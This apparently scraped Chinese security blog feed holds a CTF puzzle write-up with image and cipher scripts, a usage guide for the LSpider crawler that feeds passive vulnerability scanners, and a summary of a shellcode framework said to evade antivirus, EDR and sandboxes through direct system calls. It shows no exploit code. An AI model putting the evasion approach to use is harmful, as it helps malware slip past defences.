sample</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> sample[i] == modelSample[<span class="string">&quot;sample&quot;</span>][i]:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find out the best match with rotate</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestRotate</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flags.append(SamplingMatch(modelSample, sample))</span><br><span class="line">        sample = SamplingRotate(sample)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)) * (-<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate a sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingRotate</span>(<span class="params">sample</span>):</span></span><br><span class="line">    newSamplings = []</span><br><span class="line">    index = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        newSamplings.append(sample[index[i]])</span><br><span class="line">    <span class="keyword">return</span> newSamplings</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find a best match with rotate and parse to data for a puzzle sample</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestSolve</span>(<span class="params">modelSamplings, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    degrees = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelSamplings)):</span><br><span class="line">        flag, degree = SamplingBestRotate(modelSamplings[i], sample)</span><br><span class="line">        flags.append(flag)</span><br><span class="line">        degrees.append(degree)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)), degrees[flags.index(<span class="built_in">max</span>(flags))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># squeeze model and parse to JSON</span></span><br><span class="line">PIECES = <span class="number">225</span></span><br><span class="line">SQURE_LENGTH = <span class="number">42</span></span><br><span class="line"></span><br><span class="line">modelRegions, widthPieceCount = ModelPictureSqueeze(<span class="string">&quot;model.png&quot;</span>, PIECES, SQURE_LENGTH)</span><br><span class="line">modelSamplings = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelRegions)):</span><br><span class="line">    modelSamplings.append(&#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: <span class="number">2</span> <span class="keyword">if</span> (i == <span class="built_in">len</span>(modelRegions) - <span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">if</span> ((i + <span class="number">1</span>) % widthPieceCount) == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;sample&quot;</span>: NinePointSamplingAnalyze(modelRegions[i])</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(modelSamplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># process puzzle</span></span><br><span class="line">samplings = []</span><br><span class="line">files = os.listdir(<span class="string">&quot;blocks/&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;blocks/&quot;</span> + files[i])</span><br><span class="line">    samplings.append(&#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;rotate&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;sample&quot;</span>: NinePointSamplingAnalyze(img),</span><br><span class="line">        <span class="string">&quot;oldFileName&quot;</span>: files[i],</span><br><span class="line">        <span class="string">&quot;newFileName&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(samplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare fileName</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(samplings)):</span><br><span class="line">    samplings[i][<span class="string">&quot;flag&quot;</span>], fileIndex, samplings[i][<span class="string">&quot;rotate&quot;</span>] = SamplingBestSolve(modelSamplings, samplings[i][<span class="string">&quot;sample&quot;</span>])</span><br><span class="line">    samplings[i][<span class="string">&quot;newFileName&quot;</span>] = <span class="string">&#x27;&#123;&#125;.&#123;&#125;&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(fileIndex // widthPieceCount, fileIndex % widthPieceCount, <span class="string">&#x27;.E&#x27;</span> <span class="keyword">if</span> fileIndex // widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">and</span> fileIndex % widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;.L&#x27;</span> <span class="keyword">if</span> fileIndex % widthPieceCount == widthPieceCount - <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">jsonData = json.dumps(samplings)</span><br><span class="line">print(jsonData)</span><br><span class="line"></span><br><span class="line">heightPieceCount = PIECES // widthPieceCount</span><br><span class="line">composeImg = Image.new(<span class="string">&quot;RGB&quot;</span>, (heightPieceCount * SQURE_LENGTH, widthPieceCount * SQURE_LENGTH))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(samplings)):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;blocks/&quot;</span> + samplings[i][<span class="string">&quot;oldFileName&quot;</span>])</span><br><span class="line">    img = img.rotate(samplings[i][<span class="string">&quot;rotate&quot;</span>])</span><br><span class="line">    positionY = <span class="built_in">int</span>(samplings[i][<span class="string">&quot;newFileName&quot;</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    positionX = <span class="built_in">int</span>(samplings[i][<span class="string">&quot;newFileName&quot;</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    composeImg.paste(img, (positionX * SQURE_LENGTH, positionY * SQURE_LENGTH))</span><br><span class="line">composeImg.save(<span class="string">&quot;output/result.png&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="8-碑寺六十四卦"><a href="#8-碑寺六十四卦" class="headerlink" title="8.碑寺六十四卦"></a>8.碑寺六十四卦</h2><blockquote><p>这是从一处寺庙遗址中得到的碑文拓片，你能从中发现什么吗？ <a href="https://ctfshow.lanzous.com/iSFN4kn5jna">https://ctfshow.lanzous.com/iSFN4kn5jna</a><br>感谢@cheyenne师傅供题</p><p>Hint1、为什么碑文上空白的地方，拓片上却是黑黑一片呢？<br>Hint2、如果说每个方块对应一个字符，可是替换表在哪里？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3144821020.png"></p></blockquote><p>先将图片反色：<a href="https://invert.imageonline.co/cn/"><strong>在线工具</strong></a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2073626229.png"></p><p>然后放入steg lsb发现一个PNG</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/395331647.png"></p><p>save bin保存并修改下头文件得到</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1365365608.png"></p><p>接着将图中与六十四卦图相比对</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1010841000.png"></p><p>得到如下信息：</p><blockquote><p>晋 噬嗑 井 复 谦 丰<br>渐 大过 睽 巽 无妄 屯<br>中孚 观 归妹 革 坎 颐<br>革 明夷 否 泰 明夷</p></blockquote><p>根据题目所给的图得到对应的数字</p><blockquote><p>5 37 26 32 8 44<br>11 30 53 27 39 34<br>51 3 52 46 18 33<br>46 40 7 56 40</p></blockquote><p>对照base64编码表得到flag：flag{Le1bnizD0uShuoH4o}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1594111265.png"></p><h2 id="9-AA86"><a href="#9-AA86" class="headerlink" title="9.AA86"></a>9.AA86</h2><blockquote><p>在一台旧电脑上（大约在16位操作系统还能跑的年代）发现了这个文件，挖掘它的秘密<br>感谢@ThTsOd师傅供题</p><p>Hint:请仔细阅读题目描述(5毛一条，去掉括号)</p></blockquote><p>研究ing（0%</p><hr><h1 id="“春秋杯”新年欢乐赛"><a href="#“春秋杯”新年欢乐赛" class="headerlink" title="“春秋杯”新年欢乐赛"></a>“春秋杯”新年欢乐赛</h1><h2 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h2><blockquote><p>万物皆有”FUN”，电脑扫”FUN”活动，提供大写的”FUN”字样，即可获取flag~</p><p><a href="https://pan.baidu.com/s/150djKEGXDal5YxvYI8Pjnw"><strong>附件</strong></a>（提取码：2als）</p></blockquote><p>对着摄像头扫描带有“FUN”的字样即可获得flag</p><h2 id="2-十二宫的挑衅"><a href="#2-十二宫的挑衅" class="headerlink" title="2.十二宫的挑衅"></a>2.十二宫的挑衅</h2><blockquote><p>但愿你能解出密文，不然我就会继续犯罪:)<br>本题获取flag提交前请加上flag{}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2712412650.png"></p></blockquote><p>根据题目所描述的可知是黄道十二宫案件中的加密方式<br>先把图中的密文列出来</p><blockquote><p>^#@$@#()/&gt;@?==%1(<br>!)&gt;(<em>+3&lt;#86@-7$^.<br>4&amp;)8%#&amp;6!=%1#$-$<br>+5&amp;?#!.03!%=@=101<br>0?(*~#??.+)%&amp;.7^8<br>=1%*^=$5$7@@8&gt;&amp;<em>9<br>9@0185(+7)&lt;%3#@^4<br>&amp;@@&lt;.)#3</em>#%%&lt;&lt;</em>++<br>@.?=~**+!==65^@&amp;</p></blockquote><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">r&#x27;^#@$@#()/&gt;@?==%1(&#x27;</span>*<span class="number">9</span></span><br><span class="line">s2=<span class="string">r&#x27;!)&gt;(*+3&lt;#86@-7$^.&#x27;</span>*<span class="number">9</span></span><br><span class="line">s3=<span class="string">r&#x27;4&amp;)8%#5&amp;6!=%1#$-$&#x27;</span>*<span class="number">9</span></span><br><span class="line">s4=<span class="string">r&#x27;+5&amp;?#!.03!%=@=101&#x27;</span>*<span class="number">9</span></span><br><span class="line">s5=<span class="string">r&#x27;0?(*~#??.+)%&amp;.7^8&#x27;</span>*<span class="number">9</span></span><br><span class="line">s6=<span class="string">r&#x27;=1%*^=$5$7@@8&gt;&amp;*9&#x27;</span>*<span class="number">9</span></span><br><span class="line">s7=<span class="string">r&#x27;9@0185(+7)&lt;%3#@^4&#x27;</span>*<span class="number">9</span></span><br><span class="line">s8=<span class="string">r&#x27;&amp;@@&lt;.)#3*#%%&lt;&lt;*++&#x27;</span>*<span class="number">9</span></span><br><span class="line">s9=<span class="string">r&#x27;.@.?=~**+!==65^@&amp;&#x27;</span>*<span class="number">9</span></span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    tmp += s1[i]+s2[i+<span class="number">2</span>]+s3[i+<span class="number">4</span>]+s4[i+<span class="number">6</span>]+s5[i+<span class="number">8</span>]+s6[i+<span class="number">10</span>]+s7[i+<span class="number">12</span>]+s8[i+<span class="number">14</span>]+s9[i+<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span>(<span class="params">obj, sec</span>):</span></span><br><span class="line">    str_list = [obj[i:i+sec] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(obj),sec)]</span><br><span class="line">    print(str_list)</span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line">l1=cut(tmp,<span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">    <span class="built_in">print</span> (i)</span><br></pre></td></tr></table></figure><p>跑一下得到如下信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3595330600.png"></p><p>最后使用工具AZdecrypt解密得到flag：flag{WUUHUUTAKEOFF}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2676303170.png"></p><h2 id="3-puzzle"><a href="#3-puzzle" class="headerlink" title="3.puzzle"></a>3.puzzle</h2><blockquote><p>拼图的好处：<br>1、动手又动脑，开发智力，增加几何空间感<br>2、你可以在拼好后的作品上发挥想象，绘上与众不同的色彩，这样，你的作品就成了独一无二的艺术品了。<br>3、与家人或朋友一起拼装，增加了交流，增进感情与亲情<br>这么多的益处，所以赶紧来玩吧~</p><p><a href="https://pan.baidu.com/s/1OD4bV7JzNiZQpbvrngE0Aw"><strong>附件</strong></a>（提取码：l1hs）</p></blockquote><p>手工拼图，将有字的碎片单独提取出来</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3417490372.png"></p><p>利用PS进行拼图得到flag：flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/457811397.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大吉大利杯 </tag>
            
            <tag> 春秋杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为被动扫描器量身打造一款爬虫 - LSpider</title>
      <link href="2021/01/29/LSpider/"/>
      <url>2021/01/29/LSpider/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作者:LoRexxar’@知道创宇404实验室<br>日期：2021年1月28日<br>github开源地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider</span><br></pre></td></tr></table></figure><h1 id="什么是LSpider"><a href="#什么是LSpider" class="headerlink" title="什么是LSpider?"></a>什么是LSpider?</h1><p>一款为被动扫描器而生的前端爬虫~</p><p>由Chrome Headless、LSpider主控、Mysql数据库、RabbitMQ、被动扫描器5部分组合而成。<br>(1) 建立在Chrome Headless基础上，将模拟点击和触发事件作为核心原理，通过设置代理将流量导出到被动扫描器。<br>(2) 通过内置任务+子域名api来进行发散式的爬取，目的经可能的触发对应目标域的流量。<br>(3) 通过RabbitMQ来进行任务管理，支持大量线程同时任务。<br>(4) 智能填充表单，提交表单等。<br>(5) 通过一些方式智能判断登录框，并反馈给使用者，使用者可以通过添加cookie的方式来完成登录。<br>(6) 定制了相应的Webhook接口，以供Webhook统计发送到微信。<br>(7) 内置了Hackerone、bugcrowd爬虫，提供账号的情况下可以一键获取某个目标的所有范围。</p><h2 id="为什么选择LSpider"><a href="#为什么选择LSpider" class="headerlink" title="为什么选择LSpider?"></a>为什么选择LSpider?</h2><p>LSpider是专门为被动扫描器定制的爬虫，许多功能都是为被动扫描器而服务的。<br>建立在RabbitMQ的任务管理系统相当稳定，可以长期在无人监管的情况下进行发散式的爬取。</p><h2 id="LSpider的最佳实践是什么？"><a href="#LSpider的最佳实践是什么？" class="headerlink" title="LSpider的最佳实践是什么？"></a>LSpider的最佳实践是什么？</h2><p>服务器1（2c4g以上）: Nginx + Mysql + Mysql管理界面（phpmyadmin）<br>将被动扫描器的输出位置设置为web路径下，这样可以通过Web同时管理结果以及任务。<br>LSpider部署5线程以上，设置代理连接被动扫描器（被动扫描器可以设置专门的漏扫代理）<br>服务器2（非必要，但如果部署在服务器1，那么就需要更好的配置）：RabbitMQ</p><h2 id="还有什么问题？"><a href="#还有什么问题？" class="headerlink" title="还有什么问题？"></a>还有什么问题？</h2><p>LSpider从设计之初是为了配合像xray这种被动扫描器而诞生的，但可惜的是，在工具发展的过程中，深刻认识到爬虫是无法和被动扫描器拆分开来的。<br>强行将应该在被动扫描器实现的功能在爬虫端实现简直是舍本逐末，所以我们发起了另一个被动扫描器项目，如果有机会，后续还会开源出来给大家。</p><h2 id="设计思路？"><a href="#设计思路？" class="headerlink" title="设计思路？"></a>设计思路？</h2><p>详情请阅读：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lorexxar.cn&#x2F;2021&#x2F;01&#x2F;28&#x2F;lspider-design&#x2F;</span><br></pre></td></tr></table></figure><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>安装与使用参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider&#x2F;blob&#x2F;master&#x2F;docs&#x2F;init.md</span><br></pre></td></tr></table></figure><p>你可以通过下面的命令来测试是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py SpiderCoreBackendStart --test</span><br></pre></td></tr></table></figure><p>值得注意的是，以下脚本可能会涉及到项目路径影响，使用前请修改相应的配置</p><p>启动LSpider webhook（默认端口2062）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_webhook.sh</span><br></pre></td></tr></table></figure><p>启动LSpider</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_start.sh</span><br></pre></td></tr></table></figure><p>完全关闭LSpider</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_stop.sh</span><br></pre></td></tr></table></figure><p>启动被动扫描器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;xray.sh</span><br></pre></td></tr></table></figure><h2 id="一些关键的配置"><a href="#一些关键的配置" class="headerlink" title="一些关键的配置"></a>一些关键的配置</h2><p>Mysql配置<br>值得注意的是，如果django版本变化，这部分配置可能发生变化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;LSpider&#39;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;lspider123!@#&#39;,</span><br><span class="line">        &#39;HOST&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;PORT&#39;: &#39;3306&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;: &#123;</span><br><span class="line">            &#39;init_command&#39;: &#39;SET default_storage_engine&#x3D;INNODB;SET NAMES utf8mb4&#39;,</span><br><span class="line">            &#39;charset&#39;: &#39;utf8mb4&#39;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>Chrome访问到的文件储存</del>位置已废弃，默认下载到/dev/null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHROME_DOWNLOAD_PATH &#x3D; &#39;&#x2F;tmp&#x2F;lspider&#39;</span><br></pre></td></tr></table></figure><p>LIMIT_DEEP为爬虫深度，即从目标开始直到第几层不再继续 THREADPOOL_MAX_THREAD_NUM 线程池数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIMIT_DEEP &#x3D; 2</span><br><span class="line">THREADPOOL_MAX_THREAD_NUM &#x3D; 5</span><br></pre></td></tr></table></figure><p>RabbitMQ配置，值得注意的是，建议使用RabbitMQ，因为基于队列的任务管理非常容易爆内存，无法解决。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># rabbitmq</span><br><span class="line">RABBITMQ_IP &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_PORT &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_USERNAME &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_PASSWORD &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_VHOST &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line"># wheather open rabbitmq</span><br><span class="line">IS_OPEN_RABBITMQ &#x3D; True</span><br></pre></td></tr></table></figure><p>Chrome Headless配置，将被动扫描器的代理填写在这里，建议开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># proxy for chrome headless</span><br><span class="line">IS_OPEN_CHROME_PROXY &#x3D; True</span><br><span class="line">CHROME_PROXY &#x3D; &#39;127.0.0.1:7777&#39;</span><br><span class="line"></span><br><span class="line">Hackerone 账号配置，只有配置完成之后才可以使用Hackerone爬虫</span><br><span class="line"></span><br><span class="line"># for hackerone</span><br><span class="line">HACKERONE_USERNAME &#x3D; &quot;&quot;</span><br><span class="line">HACKERONE_PASSWORD &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>是否开启微信推送（配合webhook）,相关配置是推送到企业微信小程序的。<br>其中，debug为传送一些debug信息的配置，WECHAT_NOTICE为传输结果的配置。<br>其中各个配置可以参考企业微信小程序处id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># loghander</span><br><span class="line">LOGHANDER_IS_OPEN_WEIXIN &#x3D; False</span><br><span class="line"></span><br><span class="line"># for weixin</span><br><span class="line">WECHAT_NOTICE &#x3D; &#123;</span><br><span class="line">    &#39;corp_id&#39;: &#39; &#39;,</span><br><span class="line">    &#39;secret&#39;: &#39; &#39;,</span><br><span class="line">    &#39;agent_id&#39;: &#39; &#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">WECHAT_NOTICE_DEBUG &#x3D; &#123;</span><br><span class="line">    &#39;corp_id&#39;: &#39; &#39;,</span><br><span class="line">    &#39;secret&#39;: &#39; &#39;,</span><br><span class="line">    &#39;agent_id&#39;: &#39; &#39;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果开启这个配置，Chrome webdriver 会以非headless的模式启动，便于调试环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># for test </span><br><span class="line">IS_TEST_ENVIRONMENT &#x3D; False</span><br></pre></td></tr></table></figure><h1 id="如何配置扫描任务-以及-其他的配置相关"><a href="#如何配置扫描任务-以及-其他的配置相关" class="headerlink" title="如何配置扫描任务 以及 其他的配置相关"></a>如何配置扫描任务 以及 其他的配置相关</h1><p>其中包含了如何配置扫描任务、鉴权信息、webhook。<br>值得注意的是，文中提到的Cookie配置，格式为浏览器请求包复制即可。<br>如何配置扫描任务以及其他的配置相关，详情请参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider&#x2F;blob&#x2F;master&#x2F;docs&#x2F;manage.md</span><br></pre></td></tr></table></figure><h1 id="使用内置的hackerone、bugcrowd爬虫获取目标"><a href="#使用内置的hackerone、bugcrowd爬虫获取目标" class="headerlink" title="使用内置的hackerone、bugcrowd爬虫获取目标"></a>使用内置的hackerone、bugcrowd爬虫获取目标</h1><p>使用hackerone爬虫，你需要首先配置好hackerone账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\manage.py HackeroneSpider &#123;appname&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/108022567.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2623459159.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode免杀框架内附SysWhispers2_x86直接系统调用</title>
      <link href="2021/01/29/shellcode%E5%85%8D%E6%9D%80%E6%A1%86%E6%9E%B6%E5%86%85%E9%99%84SysWhispers2_x86%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
      <url>2021/01/29/shellcode%E5%85%8D%E6%9D%80%E6%A1%86%E6%9E%B6%E5%86%85%E9%99%84SysWhispers2_x86%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作者：mai1zhi2<br>文章链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1360548-1-1.html</span><br></pre></td></tr></table></figure><p>github地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mai1zhi2&#x2F;ShellCodeFramework</span><br></pre></td></tr></table></figure><hr><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>之前分析CS4的stage时，有老哥让我写下CS免杀上线方面知识，遂介绍之前所写shellcode框架，该框架的shellcode执行部分利用系统特性和直接系统调用（Direct System Call）执行，得以免杀主流杀软（火绒、360全部产品、毒霸等）,该方式也是主流绕过3环AV、EDR、沙箱的常用手段。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4000592497.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3409319142.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1685466589.png"></p><h1 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h1><p>github地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mai1zhi2&#x2F;ShellCodeFramework</span><br></pre></td></tr></table></figure><p>该框架主要由四个项目组成：<br>GenerateShellCode：负责生成相关功能的shellcode。<br>EncryptShellCode：负责以AES128加密所将执行的shellcode。<br>FunctionHash：负责计算shell中所用到函数的hash值。<br>XShellCodeLoader：负责执行加密后的shellcode。</p><p>运行原理详情，请阅读这篇文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1360548-1-1.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
